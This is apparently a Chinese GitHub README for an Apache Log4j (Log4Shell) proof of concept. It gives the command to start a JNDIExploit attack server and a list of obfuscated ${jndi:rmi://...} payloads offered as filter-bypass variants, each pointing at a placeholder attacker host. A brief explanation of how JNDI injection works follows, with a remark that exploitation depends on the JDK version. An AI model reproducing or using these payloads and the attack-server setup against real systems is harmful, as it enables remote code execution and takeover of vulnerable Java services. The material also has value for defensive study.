# apache_log4j_poc
apache log4j poc—— base Maven

原理：[https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg](https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg)

使用[JNDIExploit](https://github.com/feihong-cs/JNDIExploit)开启jndi服务器：
```
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.171.1 -l 12344 -p 9999 
```
![image](https://user-images.githubusercontent.com/49781523/145537707-1885a6f1-b51e-4f8a-a14d-701669568193.png)


![image](https://user-images.githubusercontent.com/49781523/145537663-a1e1d368-d726-4a07-8453-158454ce1c45.png)


参考文章：[https://www.codenong.com/f23e29b783ff38df36c9/](https://www.codenong.com/f23e29b783ff38df36c9/)

# bypass 方式
```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
```

## 总结
[JNDI注入原理及利用](https://xz.aliyun.com/t/6633#toc-7)
![在这里插入图片描述](https://img-blog.csdnimg.cn/3a4e7244ac8545279e15fef220f64d21.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16)


```
JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading,而是URLClassLoader）。
```
这个漏洞的利用跟JDK中的配置有很大关系，换句话说跟jdk版本关系很大。
只要JDK版本无漏洞，那么apache log4j的这个RCE就很难利用成功。
